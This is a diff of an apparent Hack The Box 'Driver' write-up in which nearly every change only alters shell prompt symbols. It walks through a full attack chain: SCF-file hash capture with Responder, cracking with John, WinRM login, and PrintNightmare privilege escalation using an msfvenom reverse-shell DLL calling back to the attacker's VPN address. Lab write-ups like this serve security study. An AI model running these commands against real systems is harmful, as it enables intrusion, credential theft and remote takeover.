@@ -16,7 +16,7 @@
 prepped engagement structure; fish for environment variables and tmux for logging
 
 ```sh
-> cat env.fish
+❯ cat env.fish
 # env.fish
 set -gx ENGAGEMENT_DIR (pwd -P)
 set -gx ENGAGEMENT "driver"
@@ -29,10 +29,10 @@ if set -q TMUX
     tmux set-environment -t "$session" ENGAGEMENT_DIR "$ENGAGEMENT_DIR"
 end
 
-> . env.fish
+❯ . env.fish
 [no output]
 
-> tree
+❯ tree
 .
 ├── env.fish
 ├── logs
@@ -57,7 +57,7 @@ end
 began with the usual nmap scans
 
 ```sh
-> nmap -sVC -oA scans/initial $IP
+❯ nmap -sVC -oA scans/initial $IP
 80/tcp   open  http         Microsoft IIS httpd 10.0
 135/tcp  open  msrpc        Microsoft Windows RPC
 445/tcp  open  microsoft-ds Microsoft Windows 7 - 10
@@ -65,12 +65,12 @@ began with the usual nmap scans
 
 Service Info: Host: DRIVER; OS: Windows
 
-> nmap -Pn -p- --min-rate 1000 -oA scans/allports $IP
+❯ nmap -Pn -p- --min-rate 1000 -oA scans/allports $IP
 Not shown: 65534 filtered tcp ports (no-response)
 PORT     STATE SERVICE
 5985/tcp open  wsman
 
-> nmap -sUV --top-ports 100 -oA scans/udp $IP
+❯ nmap -sUV --top-ports 100 -oA scans/udp $IP
 All 100 scanned ports on driver.htb (<TARGET_IP>) are in ignored states.
 ```
 
@@ -99,10 +99,10 @@ the realm gave me the username `admin`. tried the obvious default creds and got 
 printer firmware update center. the footer gave me `support@driver.htb`, so added the hostname to `/etc/hosts`
 
 ```sh
-> echo "$IP    driver.htb" | sudo tee -a /etc/hosts
+❯ echo "$IP    driver.htb" | sudo tee -a /etc/hosts
 [HTB_TARGET_IP]    driver.htb
 
-> whatweb http://driver.htb
+❯ whatweb http://driver.htb
 http://driver.htb [401 Unauthorized] HTTPServer[Microsoft-IIS/10.0], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
 ```
 
@@ -119,10 +119,10 @@ two things stood out, the files were being uploaded to a share and someone was g
 tried some anonymous smb and rpc enumeration first
 
 ```sh
-> smbclient --list=driver.htb --no-pass
+❯ smbclient --list=driver.htb --no-pass
 session setup failed: NT_STATUS_ACCESS_DENIED
 
-> rpcclient -U "" -N $IP -c 'enumdomusers'
+❯ rpcclient -U "" -N $IP -c 'enumdomusers'
 Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
 ```
 
@@ -142,7 +142,7 @@ SCF files can reference an icon on a remote share. the interesting part is Windo
 prepared a test file and monitored my VPN interface with Responder
 
 ```sh
-> cat firmware.scf
+❯ cat firmware.scf
 
 [Shell]
 Command=2
@@ -153,12 +153,12 @@ Command=ToggleDesktop
 
 
 ```sh
-> ip -br addr
+❯ ip -br addr
 
 # ip -br addr (selected)
 tun0   UNKNOWN   [VPN_IP]/23
 
-> sudo responder -I tun0 -v
+❯ sudo responder -I tun0 -v
 
 # Responder (selected)
 SMB server                 [ON]
@@ -184,7 +184,7 @@ this was a NetNTLMv2 challenge-response, not Tony's NT hash
 used John and rockyou to recover Tony's password
 
 ```sh
-> john --wordlist=/usr/share/wordlists/rockyou.txt hash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 [REDACTED]          (tony)
@@ -195,7 +195,7 @@ Session completed
 had WinRM on 5985 from my initial scan, tested the creds
 
 ```sh
-> evil-winrm -i $IP -u tony -p "$TONY_PASS"
+❯ evil-winrm -i $IP -u tony -p "$TONY_PASS"
 
 Evil-WinRM shell v4.1
 Info: Establishing connection to remote endpoint
@@ -211,7 +211,7 @@ Info: Connection successful
 ### user context
 
 ```powershell
-> whoami /priv
+PS whoami /priv
 
 SeShutdownPrivilege
 SeChangeNotifyPrivilege
@@ -219,7 +219,7 @@ SeUndockPrivilege
 SeIncreaseWorkingSetPrivilege
 SeTimeZonePrivilege
 
-> whoami /groups
+PS whoami /groups
 
 BUILTIN\Remote Management Users
 BUILTIN\Users
@@ -232,13 +232,13 @@ nothing particularly interesting in the privileges. `Remote Management Users` ex
 tried enumerating services, access denied
 
 ```powershell
-> cmd.exe /c sc.exe query
+PS cmd.exe /c sc.exe query
 
 # sc.exe query
 [SC] OpenSCManager FAILED 5:
 Access is denied.
 
-> Get-Service
+PS Get-Service
 
 # Get-Service
 Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
@@ -247,14 +247,14 @@ Cannot open Service Control Manager on computer '.'. This operation might requir
 moved on to processes, local listeners and the OS version
 
 ```powershell
-> Get-Process
+PS Get-Process
 
 # Get-Process (selected)
 Id    ProcessName
 1164  spoolsv
 3764  wsmprovhost
 
-> netstat -ano
+PS netstat -ano
 
 # netstat -ano (selected)
 TCP    0.0.0.0:80      0.0.0.0:0   LISTENING    4
@@ -263,7 +263,7 @@ TCP    0.0.0.0:445     0.0.0.0:0   LISTENING    4
 TCP    0.0.0.0:5985    0.0.0.0:0   LISTENING    4
 TCP    0.0.0.0:49410   0.0.0.0:0   LISTENING    1164
 
-> cmd /c ver
+PS cmd /c ver
 
 # cmd /c ver
 Microsoft Windows [Version 10.0.10240]
@@ -274,7 +274,7 @@ Microsoft Windows [Version 10.0.10240]
 ### powershell history
 
 ```powershell
-> (Get-PSReadLineOption).HistorySavePath
+PS (Get-PSReadLineOption).HistorySavePath
 
 The 'Get-PSReadLineOption' command was found in the module 'PSReadline', but the module could not be loaded.
 FullyQualifiedErrorId : CouldNotAutoloadMatchingModule
@@ -283,7 +283,7 @@ FullyQualifiedErrorId : CouldNotAutoloadMatchingModule
 `Get-PSReadLineOption` failed to load the PSReadLine module, so I checked the history files directly instead
 
 ```powershell
-> foreach($user in ((ls C:\Users).FullName)){
+PS foreach($user in ((ls C:\Users).FullName)){
     cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
 }
 
@@ -301,17 +301,17 @@ now I had a specific printer driver and version to investigate
 found a hidden Ricoh driver directory under `ProgramData`
 
 ```powershell
-> gci -force C:\ProgramData\RICOH_DRV
+PS gci -force C:\ProgramData\RICOH_DRV
 d--h--  RICOH PCL6 UniversalDriver V4.23
 
-> icacls C:\ProgramData\RICOH_DRV
+PS icacls C:\ProgramData\RICOH_DRV
 C:\ProgramData\RICOH_DRV Everyone:(OI)(CI)(F)
 ```
 
 Everyone had full control, with inheritance for files and directories. looked for exploits with searchsploit
 
 ```sh
-> searchsploit "ricoh"
+❯ searchsploit "ricoh"
 
 Ricoh Driver - Privilege Escalation (Metasploit)    windows/local/48036.rb
 Ricoh Printer Drivers - Local Privilege Escalation windows/local/47962.c
@@ -322,13 +322,13 @@ spent a fair bit of time going through the C PoC for CVE-2019-19363. it monitors
 checked the directory again before looking at the registered driver
 
 ```powershell
-> icacls c:\programdata\ricoh_drv
+PS icacls c:\programdata\ricoh_drv
 c:\programdata\ricoh_drv Everyone:(OI)(CI)(F)
 
-> dir c:\programdata\ricoh_drv
+PS dir c:\programdata\ricoh_drv
 [no output]
 
-> cmd /c dir c:\programdata\ricoh_drv
+PS cmd /c dir c:\programdata\ricoh_drv
 Directory of c:\programdata\ricoh_drv
 File Not Found
 ```
@@ -336,7 +336,7 @@ File Not Found
 the normal listings didn't show the hidden directory
 
 ```powershell
-> gci 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers' -recurse -erroraction silentlycontinue |
+PS gci 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers' -recurse -erroraction silentlycontinue |
     where-object { $_.PSChildName -match 'RICOH' } | Select-Object Name
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\RICOH PCL6 UniversalDriver V4.23
@@ -345,7 +345,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x
 selected values from the driver's registry entry:
 
 ```powershell
-> get-itemproperty -literalpath 'hklm:\system\currentcontrolset\control\print\environments\windows x64\Drivers\Version-3\RICOH PCL6 UniversalDriver v4.23' |format-list *
+PS get-itemproperty -literalpath 'hklm:\system\currentcontrolset\control\print\environments\windows x64\Drivers\Version-3\RICOH PCL6 UniversalDriver v4.23' |format-list *
 
 Configuration File : ricu0nui.dll
 Driver             : ricu0ngr.dll
@@ -358,19 +358,19 @@ LastServicedBuild  : 10240
 checked the configuration DLL under the spool driver directory
 
 ```powershell
-> gci -path C:\Windows\System32\spool\drivers\x64\ -recurse -filter "ricu0nui.dll" -file
+PS gci -path C:\Windows\System32\spool\drivers\x64\ -recurse -filter "ricu0nui.dll" -file
 
 Directory: C:\Windows\System32\spool\drivers\x64\3
 -a----    6/10/2019  1:17 PM    4557312  ricu0nui.dll
 
-> (get-acl -path c:\windows\system32\spool\drivers\x64).access | format-table -autosize
+PS (get-acl -path c:\windows\system32\spool\drivers\x64).access | format-table -autosize
 
 FileSystemRights            AccessControlType  IdentityReference
 FullControl                 Allow              NT AUTHORITY\SYSTEM
 FullControl                 Allow              BUILTIN\Administrators
 ReadAndExecute, Synchronize Allow              Everyone
 
-> icacls c:\windows\system32\spool\drivers\x64\3\ricu0nui.dll
+PS icacls c:\windows\system32\spool\drivers\x64\3\ricu0nui.dll
 
 NT AUTHORITY\SYSTEM:(I)(F)
 BUILTIN\Administrators:(I)(F)
@@ -383,22 +383,22 @@ Everyone had RX on the DLL in the spool directory, not F like the permissions un
 went back to `ProgramData` and enumerated the hidden driver directory
 
 ```powershell
-> dir c:\programdata
+PS dir c:\programdata
 
 d-----   MySQL
 d-----   Package Cache
 d-----   VMware
 <--snip-->
 
-> dir c:\programdata -Force
+PS dir c:\programdata -Force
 
 d--h--   RICOH_DRV
 <--snip-->
 
-> icacls c:\programdata\RICOH_DRV
+PS icacls c:\programdata\RICOH_DRV
 c:\programdata\RICOH_DRV Everyone:(OI)(CI)(F)
 
-> dir C:\ProgramData\RICOH_DRV -Force -Recurse | select fullname, mode, length
+PS dir C:\ProgramData\RICOH_DRV -Force -Recurse | select fullname, mode, length
 
 # selected paths relative to RICOH_DRV
 RICOH PCL6 UniversalDriver V4.23                         d--h--
@@ -410,10 +410,10 @@ RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll     -a---- 3960832
 among the contents were a number of DLLs in the driver's `_common\dlz` directory. checked two of the individual DLL ACLs; both `jobhook.dll` and `popup.dll` showed `Everyone:(F)`
 
 ```powershell
-> icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\jobhook.dll"
+PS icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\jobhook.dll"
 C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\jobhook.dll Everyone:(F)
 
-> icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll"
+PS icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll"
 C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll Everyone:(F)
 ```
 
@@ -429,7 +429,7 @@ confirmed the weak permissions on the DLLs themselves. spent some time looking t
 went back to the spooler itself and checked the RPC endpoints. initially supplied only `--target-ip`, which failed because the positional target was missing
 
 ```sh
-> impacket-rpcdump --target-ip $IP
+❯ impacket-rpcdump --target-ip $IP
 
 rpcdump.py: error: the following arguments are required: target
 ```
@@ -437,7 +437,7 @@ rpcdump.py: error: the following arguments are required: target
 passed the IP as the target instead
 
 ```sh
-> impacket-rpcdump "$IP"
+❯ impacket-rpcdump "$IP"
 
 Protocol: [MS-RPRN]: Print System Remote Protocol
 Provider: spoolsv.exe
@@ -456,7 +456,7 @@ https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare
 switched to testing the CVE-2021-1675 PowerShell proof of concept available in Kali's windows-resources. reconnected with Evil-WinRM, uploaded a DLL and loaded the script. the initial upload output showed a destination different from what I intended; the notes don't show the intervening correction
 
 ```sh
-> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<VPN_IP> LPORT=1337 -f dll -o /tmp/pwn.dll
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<VPN_IP> LPORT=1337 -f dll -o /tmp/pwn.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -466,7 +466,7 @@ Saved as: pwn.dll
 ```
 
 ```sh
-> evil-winrm -i $IP -u tony -p "$TONY_PASS" -e /usr/share/windows-resources/CVE-2021-1675/ -s /usr/share/windows-resources/CVE-2021-1675/
+❯ evil-winrm -i $IP -u tony -p "$TONY_PASS" -e /usr/share/windows-resources/CVE-2021-1675/ -s /usr/share/windows-resources/CVE-2021-1675/
 
 Info: Connection successful
 *Evil-WinRM* PS C:\Users\tony\Documents>
@@ -475,7 +475,7 @@ Info: Connection successful
 tried a few different payloads. the generated and uploaded DLL sizes in the excerpts below are from different attempts
 
 ```powershell
-> upload /tmp/pwn.dll c:\windows\temp\
+PS upload /tmp/pwn.dll c:\windows\temp\
 
 Info: Uploading /tmp/pwn.dll to C:\Users\tony\Documents\c:windowstemp\
 Data: 12288 bytes of 12288 bytes copied
@@ -484,10 +484,10 @@ Info: Upload successful!
 
 
 ```powershell
-> CVE-2021-1675.ps1
+PS CVE-2021-1675.ps1
 [no separate output recorded]
 
-> menu
+PS menu
 
 [+] get_nightmare_dll
 [+] Invoke-Nightmare
@@ -499,14 +499,14 @@ the script exposed the functions in the Evil-WinRM menu
 Penelope was listening on Kali when the callback arrived
 
 ```sh
-> penelope -p 1337
+❯ penelope -p 1337
 [listener output not transcribed; subsequent SYSTEM session shown below]
 ```
 
 when I ran Invoke-Nightmare, the output said that AddPrinterDriverEx failed
 
 ```powershell
-> invoke-nightmare -dll c:\windows\temp\pwn.dll
+PS invoke-nightmare -dll c:\windows\temp\pwn.dll
 
 [+] using user-supplied payload at c:\windows\temp\pwn.dll
 [!] ignoring NewUser and NewPassword arguments
@@ -517,7 +517,7 @@ FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke
 despite the error, Penelope received a new shell as SYSTEM
 
 ```cmd
-> whoami
+C:\Windows\system32>whoami
 nt authority\system
 ```
 
